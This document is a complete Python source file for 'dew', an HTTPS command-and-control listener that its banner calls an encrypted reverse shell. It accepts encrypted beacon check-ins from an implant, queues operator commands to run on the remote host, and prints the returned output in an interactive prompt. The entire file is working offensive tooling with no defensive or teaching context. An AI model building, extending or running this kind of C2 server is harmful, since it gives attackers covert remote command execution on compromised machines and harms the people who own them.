#!/usr/bin/env python3
"""
dew listener - Python HTTPS C2 listener
XChaCha20-Poly1305 encrypted command channel
"""

import argparse
import ssl
import threading
import queue
import os
import sys
import tempfile
import subprocess
from http.server import HTTPServer, BaseHTTPRequestHandler

try:
    from nacl.bindings import (
        crypto_aead_xchacha20poly1305_ietf_encrypt,
        crypto_aead_xchacha20poly1305_ietf_decrypt,
    )
    HAS_NACL = True
except ImportError:
    HAS_NACL = False

NONCE_SIZE = 24
MAC_SIZE = 16
KEY_SIZE = 32

# ── catppuccin mocha ──
C_BLUE = "\033[38;2;137;180;250m"
C_SAPPHIRE = "\033[38;2;116;199;236m"
C_TEAL = "\033[38;2;148;226;213m"
C_GREEN = "\033[38;2;166;227;161m"
C_RED = "\033[38;2;243;139;168m"
C_MAUVE = "\033[38;2;203;166;247m"
C_PEACH = "\033[38;2;250;179;135m"
C_TEXT = "\033[38;2;205;214;244m"
C_SUBTEXT = "\033[38;2;166;173;200m"
C_OVERLAY = "\033[38;2;108;112;134m"
C_SURFACE = "\033[38;2;69;71;90m"
C_RESET = "\033[0m"
C_BOLD = "\033[1m"
C_DIM = "\033[2m"

# ── globals ──
g_key = None
g_cmd_queue = queue.Queue()
g_lock = threading.Lock()


def hex_decode_key(hex_str):
    """Decode 64-char hex string to 32 raw bytes."""
    if len(hex_str) != 64:
        raise ValueError(f"PSK must be 64 hex chars (got {len(hex_str)})")
    return bytes.fromhex(hex_str)


def encrypt_msg(key, plaintext):
    """Encrypt plaintext -> [nonce(24)][mac(16)][ct] wire format."""
    nonce = os.urandom(NONCE_SIZE)
    # PyNaCl returns ciphertext || mac (mac is last 16 bytes)
    ct_with_mac = crypto_aead_xchacha20poly1305_ietf_encrypt(
        plaintext, None, nonce, key
    )
    # Rearrange to [nonce][mac][ct] for C's crypto_aead_lock
    ciphertext = ct_with_mac[:-MAC_SIZE]
    mac = ct_with_mac[-MAC_SIZE:]
    return nonce + mac + ciphertext


def decrypt_msg(key, data):
    """Decrypt [nonce(24)][mac(16)][ciphertext] -> plaintext or None."""
    if len(data) < NONCE_SIZE + MAC_SIZE:
        return None

    nonce = data[:NONCE_SIZE]
    # The C side packs as [nonce][mac(16)][ciphertext]
    # We need to rearrange to [ciphertext][mac] for PyNaCl
    mac = data[NONCE_SIZE:NONCE_SIZE + MAC_SIZE]
    ciphertext = data[NONCE_SIZE + MAC_SIZE:]
    # PyNaCl expects ciphertext || mac
    combined = ciphertext + mac

    try:
        return crypto_aead_xchacha20poly1305_ietf_decrypt(
            combined, None, nonce, key
        )
    except Exception:
        return None


class DewHandler(BaseHTTPRequestHandler):
    """HTTP request handler for implant callbacks."""

    def log_message(self, format, *args):
        """Suppress default logging."""
        pass

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length) if content_length > 0 else b""

        if self.path == "/poll":
            self._handle_poll(body)
        elif self.path == "/result":
            self._handle_result(body)
        else:
            self.send_response(404)
            self.end_headers()

    def _handle_poll(self, body):
        """Handle beacon check-in. Return queued command or 204."""
        # Decrypt beacon ID
        beacon = decrypt_msg(g_key, body)
        if beacon is None:
            self.send_response(400)
            self.end_headers()
            return

        beacon_hex = beacon.hex()
        src_ip = self.client_address[0]
        with g_lock:
            print(
                f"\r{C_TEAL}[*]{C_RESET} Beacon "
                f"{C_SAPPHIRE}{beacon_hex[:8]}{C_RESET} "
                f"check-in from {C_TEXT}{src_ip}{C_RESET}"
            )
            sys.stdout.flush()

        # Check for queued command
        try:
            cmd = g_cmd_queue.get_nowait()
        except queue.Empty:
            self.send_response(204)
            self.end_headers()
            return

        # Encrypt and send command
        enc_cmd = encrypt_msg(g_key, cmd.encode("utf-8"))
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(len(enc_cmd)))
        self.end_headers()
        self.wfile.write(enc_cmd)

    def _handle_result(self, body):
        """Handle command output from implant."""
        plaintext = decrypt_msg(g_key, body)
        if plaintext is None:
            self.send_response(400)
            self.end_headers()
            return

        output = plaintext.decode("utf-8", errors="replace")
        with g_lock:
            print(f"\r{C_GREEN}[+]{C_RESET} Result:")
            print(f"{C_TEXT}{output}{C_RESET}")
            print(f"{C_MAUVE}dew>{C_RESET} ", end="", flush=True)

        self.send_response(200)
        self.end_headers()


def generate_self_signed_cert():
    """Generate a self-signed certificate for HTTPS."""
    cert_file = os.path.join(tempfile.gettempdir(), "dew_cert.pem")
    key_file = os.path.join(tempfile.gettempdir(), "dew_key.pem")

    if not os.path.exists(cert_file) or not os.path.exists(key_file):
        print(f"{C_BLUE}[*]{C_RESET} Generating self-signed certificate...")
        subprocess.run([
            "openssl", "req", "-x509", "-newkey", "rsa:2048",
            "-keyout", key_file, "-out", cert_file,
            "-days", "365", "-nodes",
            "-subj", "/CN=localhost"
        ], check=True, capture_output=True)

    return cert_file, key_file


def print_banner(lhost, lport, key_hex):
    """Print startup banner in Catppuccin Mocha colors."""
    print()
    print(f"  {C_BLUE}{C_BOLD}      _            {C_RESET}")
    print(f"  {C_SAPPHIRE}{C_BOLD}   __| | _____      __ {C_RESET}")
    print(f"  {C_TEAL}{C_BOLD}  / _` |/ _ \\ \\ /\\ / / {C_RESET}")
    print(f"  {C_GREEN}{C_BOLD} | (_| |  __/\\ V  V /  {C_RESET}")
    print(f"  {C_GREEN}{C_BOLD}  \\__,_|\\___| \\_/\\_/   {C_RESET}")
    print()
    print(
        f"  {C_OVERLAY}encrypted https reverse shell{C_RESET}"
    )
    print(
        f"  {C_SURFACE}{'─' * 36}{C_RESET}"
    )
    print(
        f"  {C_BLUE}[*]{C_RESET} Listening on "
        f"{C_TEXT}https://{lhost}:{lport}{C_RESET}"
    )
    print(
        f"  {C_BLUE}[*]{C_RESET} PSK: "
        f"{C_PEACH}{key_hex[:8]}{C_OVERLAY}...{C_PEACH}{key_hex[-8:]}{C_RESET}"
    )
    print(
        f"  {C_SURFACE}{'─' * 36}{C_RESET}"
    )
    print()


def interactive_prompt():
    """Interactive command prompt running in a separate thread."""
    print(
        f"{C_BLUE}[*]{C_RESET} Listener ready. "
        f"Type commands to queue for the implant."
    )
    print(
        f"{C_BLUE}[*]{C_RESET} Type "
        f"{C_RED}'exit'{C_RESET} to send EXIT to implant.\n"
    )

    while True:
        try:
            cmd = input(f"{C_MAUVE}dew>{C_RESET} ")
        except (EOFError, KeyboardInterrupt):
            print(f"\n{C_RED}[!]{C_RESET} Shutting down...")
            os._exit(0)

        cmd = cmd.strip()
        if not cmd:
            continue

        if cmd.lower() == "exit":
            print(
                f"{C_PEACH}[*]{C_RESET} Sending EXIT command to implant..."
            )
            g_cmd_queue.put("EXIT")
            continue

        g_cmd_queue.put(cmd)
        print(
            f"{C_BLUE}[*]{C_RESET} Command queued: "
            f"{C_SUBTEXT}{cmd}{C_RESET}"
        )


def main():
    global g_key

    parser = argparse.ArgumentParser(description="dew listener")
    parser.add_argument("--lhost", default="0.0.0.0", help="Listen address")
    parser.add_argument("--lport", type=int, default=443, help="Listen port")
    parser.add_argument(
        "--key", required=True,
        help="64-char hex PSK (shared with implant)"
    )
    parser.add_argument("--cert", help="Path to TLS certificate")
    parser.add_argument("--cert-key", help="Path to TLS private key")
    args = parser.parse_args()

    if not HAS_NACL:
        print(
            f"{C_RED}[!]{C_RESET} PyNaCl is required. "
            f"Install with: {C_TEXT}pip install pynacl{C_RESET}"
        )
        sys.exit(1)

    # Decode PSK
    try:
        g_key = hex_decode_key(args.key)
    except ValueError as e:
        print(f"{C_RED}[!]{C_RESET} Invalid key: {e}")
        sys.exit(1)

    # TLS certificate
    if args.cert and args.cert_key:
        cert_file, key_file = args.cert, args.cert_key
    else:
        cert_file, key_file = generate_self_signed_cert()

    # Setup HTTPS server
    server = HTTPServer((args.lhost, args.lport), DewHandler)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(certfile=cert_file, keyfile=key_file)
    server.socket = ctx.wrap_socket(server.socket, server_side=True)

    print_banner(args.lhost, args.lport, args.key)

    # Start interactive prompt in background
    prompt_thread = threading.Thread(target=interactive_prompt, daemon=True)
    prompt_thread.start()

    # Serve forever
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{C_RED}[!]{C_RESET} Shutting down listener.")
        server.shutdown()


if __name__ == "__main__":
    main()
